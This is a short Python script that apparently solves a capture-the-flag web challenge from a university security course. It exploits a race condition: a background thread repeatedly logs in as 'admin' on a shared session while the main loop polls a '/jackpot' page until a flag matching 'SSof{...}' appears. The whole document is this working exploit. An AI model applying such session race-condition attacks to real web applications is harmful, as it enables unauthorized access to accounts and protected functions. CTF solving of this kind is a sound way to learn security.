import requests
import re
import threading

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23652"

s = requests.Session()
r = s.get(link)

success = False

def login_as_admin():
    s.post(link + "/login", data={"username": "admin", "password": "passwordNotEmpty"})

def login():
    while not success:
        login_as_admin()

login = threading.Thread(target=login)
login.start()

while not success:
    r = s.get(link + "/jackpot")
    match = re.search(r"SSof{.*}", r.text)
    if match:
        print(match.group(0))
        success = True
        login.join()
